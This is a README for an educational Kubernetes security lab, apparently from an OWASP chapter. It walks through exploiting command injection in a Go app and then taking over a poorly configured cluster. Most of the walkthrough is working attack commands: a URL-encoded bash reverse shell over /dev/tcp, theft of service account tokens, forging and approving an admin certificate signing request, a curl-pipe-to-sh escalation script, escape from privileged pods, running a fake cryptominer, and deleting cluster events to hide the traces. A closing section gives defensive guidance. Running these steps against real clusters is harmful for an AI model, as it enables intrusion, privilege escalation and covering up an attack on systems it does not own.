#  Welcome!
 
First and foremost, Welcome! :tada::confetti_ball:
 
Thank you for visiting the go-rce-kubernetes project repository. :balloon::balloon::balloon:
 
#### :warning::bangbang: DISCLAIMER: This repo is for educational purposes only. By using this repo and/or data herein, you agree to ASSUME ALL RESPONSIBILITY FOR THE RESULTS AND/OR USE OF THE MATERIALS. 
 
This document (the README file) is a hub to give you some information about the project. Jump straight to one of the sections below, or just scroll down to find out more.
 
* [What are we doing? (And why?)](#what-are-we-doing)
* [Who are we?](#who-are-we)
* [How to use this repository](#getting-started)
* [Get in touch](#contact-us)
* [Find out more](#general-security-guidance)
 
 
## What are we doing?
 
The intent of this repository is to take a closer look at some of the security pitfalls that may be encountered when deploying containerized applications in kubernetes. 
 
This project uses a poorly written go application to demonstrate how a single vulnerable application can compromise a poorly configured kubernetes cluster.
 
 
## Who are we?
 
The new OWASP waterloo chapter leads and security enthusiasts
* Scott Handfield
* Kristopher Jamison
* Deepak Sharma
 
 
# Getting started
 
## Pre-requisites
This project assumes you have access to a running Kubernetes cluster. If you are new to Kubernetes and need assistance setting up a cluster, please look into the following options for running a local cluster:
* [Docker-desktop](https://www.docker.com/products/kubernetes)
* [Rancher K3os](https://github.com/rancher/k3os)
* [minikube](https://minikube.sigs.k8s.io/docs/)
* [kubeadm](https://kubernetes.io/docs/setup/production-environment/tools/kubeadm/install-kubeadm/)
 
 
## Build and run
The following steps outline building and running the simulations:
1. Clone the repo
```
git clone github.com/handfields/go-rce-kubernetes
```

2. Build the vulnerable go-rce container (Optional - containers are also available on dockerhub)
```
cd go-rce-kubernetes && docker build 01-image/.
```

3. Deploy
```
kubectl apply -f 02-deployment/00-loose-cert-rbac-policy.yaml
kubectl apply -f 02-deployment/01-rce-deployment-bad.yaml
```
 
4. Exploit Vulnerablity 
- The go-rce application takes untrusted data from users as command line arguments and redirect
- Open a browser to the following link (Replace hostname and port with the external IP/port of the kubernetes service) <br>
[http://hostname:port/google.com?bash%20-i%20%26%3E%20%2Fdev%2Ftcp%2Fhostname9%2Fport%200%3E%261](http://hostname:port/google.com?bash%20-i%20%26%3E%20%2Fdev%2Ftcp%2Fhostname%2Fport%200%3E%261)
 
5. Recon
- what information can you find that might be useful for lateral movement and/or persistence in the cluster?
- service account tokens?
   ```
   find / -name '*token'
   ```
- sensitive environment variables?
  ```
  env
  ```
- explore ..
   ```
   curl -LO https://storage.googleapis.com/kubernetes-release/release/v1.19.5/bin/linux/amd64/kubectl && chmod 700 kubectl
 
   ./kubectl --token=$(cat /run/secrets/kubernetes.io/serviceaccount/token) --certificate-authority=/run/secrets/kubernetes.io/serviceaccount/ca.crt --server='https://kubernetes.default.svc.cluster.local' get pods
   ```
 
6. Elevate permissions
 
Generate and sign client certificate with elevated permissions
 
> Use script to skip this section:
>
>  ```
>  curl https://raw.githubusercontent.com/handfields/go-rce-kubernetes/main/03-h4ks/cert-eop.sh | sh
>  ```
> 
 
```bash
 
# download tools 
curl -LO https://storage.googleapis.com/kubernetes-release/release/v1.19.2/bin/linux/amd64/kubectl && chmod 700 kubectl 
curl -Lo cfssl https://github.com/cloudflare/cfssl/releases/download/v1.5.0/cfssl_1.5.0_linux_amd64 && chmod 700 cfssl
curl -Lo cfssljson https://github.com/cloudflare/cfssl/releases/download/v1.5.0/cfssljson_1.5.0_linux_amd64 && chmod 700 cfssljson

# create a certificate signing request
cat <<EOF | ./cfssl genkey - | ./cfssljson -bare server
{
  "CN": "admin",
  "names": [
      {
        "O": "system:masters"
      }
  ],
  "key": {
    "algo": "rsa",
    "size": 2048
  }
}
EOF

# create a signing request
cat <<EOF | ./kubectl --token=$(cat /run/secrets/kubernetes.io/serviceaccount/token) \
--certificate-authority=/run/secrets/kubernetes.io/serviceaccount/ca.crt apply -f -
apiVersion: certificates.k8s.io/v1beta1
kind: CertificateSigningRequest
metadata:
  name: evil
spec:
  signerName: kubernetes.io/legacy-unknown
  request: $(cat server.csr | base64 | tr -d '\n')
  usages:
  - digital signature
  - key encipherment
  - client auth
EOF

# approve certfiicate request
./kubectl --token=$(cat /run/secrets/kubernetes.io/serviceaccount/token) \
--certificate-authority=/run/secrets/kubernetes.io/serviceaccount/ca.crt \
--server='https://kubernetes.default.svc.cluster.local' \
certificate approve evil

# get client cert (server.crt)
./kubectl --token=$(cat /run/secrets/kubernetes.io/serviceaccount/token) \
--certificate-authority=/run/secrets/kubernetes.io/serviceaccount/ca.crt \
--server='https://kubernetes.default.svc.cluster.local' \
get csr evil -o jsonpath='{.status.certificate}' | base64 -d | tee server.crt

# create kubeconfig 
cat <<EOF > ./config
apiVersion: v1
kind: Config
preferences: {}
current-context: default
clusters:
  - name: default
    cluster:
      certificate-authority: /run/secrets/kubernetes.io/serviceaccount/ca.crt 
      server: https://kubernetes.default.svc.cluster.local
contexts:
- context:
    cluster: default
    namespace: default
    user: default
  name: default
users:
  - name: default
    user:
      client-certificate: $(pwd)/server.crt 
      client-key: $(pwd)/server-key.pem
      username: admin
EOF

# test
./kubectl --kubeconfig=config get pods -A
```
 
7. Perform lateral movement (Escape pod using privileged container)
```bash
#####
# Option 1 - install privileged container (using nsenter)
#####
# install privileged container (nsenter)
./kubectl --kubeconfig=config apply -f https://raw.githubusercontent.com/handfields/go-rce-kubernetes/main/02-deployment/03-priv-daemonset-nsenter.yaml
 
 
#####
# Option 2 - install privileged container (with hostPath mount)
#####
./kubectl --kubeconfig=config apply -f https://raw.githubusercontent.com/handfields/go-rce-kubernetes/main/02-deployment/04-priv-daemonset-chroot.yaml
 
# exec into pod
./kubectl --kubeconfig=config exec $(./kubectl --kubeconfig=config get pods -o=jsonpath={.items[1].metadata.name} -n mallory) -n mallory -it /bin/bash
 
# go to hostPath mount and change root (not required for nsenter)
cd /host && chroot .
 
# run fake cryptominer example
 
curl -L https://github.com/handfields/go-rce-kubernetes/releases/download/0.1.0/go-fake-crypto.tar.gz | tar xzvf - 
./go-fake-crypto <WALLET_ADDRESS>
```
 
8. Remove privileged containers and clear events
```
./kubectl --kubeconfig=config delete ns mallory 
 
./kubectl --kubeconfig=config delete events -A --all 
```
 
<br>

# General security guidance
This section introduces some general best practice guidelines for operating secure containerized workloads
 
### Build secure images
   - Use slim and minimal base images, where possible
   - Use multi-stage builds to avoid adding unnecessary binaries, libraries, files, etc.
   - Scan images and applications for security vulnerabilities
 
### Ensure binary authorization
   - Restrict access to container registries and use only verified images (ie. Cryptographically signed images, OPA policies, etc. )
 
### Remove unnecessary capabilities
   - Ensure securityContext is applied to ensure pods are running as non-root, with appropriate capabilities and read-only filesystems where possible. 
 
### Apply least privilege access
   - Apply least privilege RBAC policy 
   - Limit use of service accounts, where possible 
 
### Take caution with sensitive mount points
   - Avoid mounting service account tokens and 'hostpath', especially for pods that are exposed to lower environments (ie. internet facing, accessible form uat, dev, etc..)
 
### Isolate, Isolate and Isolate
   - Combine and use appropriate workload isolation techniques
     - ie. Namespaces, Network policies, Service mesh, restricted/secure control plane, etc.
   - Use data classification/regulatory requirements as considerations for deployment
 
### Monitor
   - Continuously scan host, images and running containers for vulnerabilities and configuration issues
   - Ensure logs are being shipped and analyzed for security issues
 
### Additional guidance, helpful tools and resources
https://cheatsheetseries.owasp.org/cheatsheets/Kubernetes_Security_Cheat_Sheet.html<br>
https://github.com/OWASP/Docker-Security<br>
https://www.nist.gov/publications/application-container-security-guide <br>
https://github.com/open-policy-agent/<br>
https://github.com/ManicodeSecurity/Defending-DevOps <br>
https://github.com/ksoclabs/kube-goat <br>
https://github.com/aquasecurity<br>
https://github.com/falcosecurity/falco<br>
https://github.com/cyberark/KubiScan<br>
https://kubernetes.io/blog/2018/07/18/11-ways-not-to-get-hacked/<br>
https://www.microsoft.com/security/blog/2020/04/02/attack-matrix-kubernetes/<br>
https://github.com/trailofbits/audit-kubernetes/tree/master/reports<br>
https://blog.aquasec.com/container-vulnerability-dzmlt-dynamic-container-analysis<br>
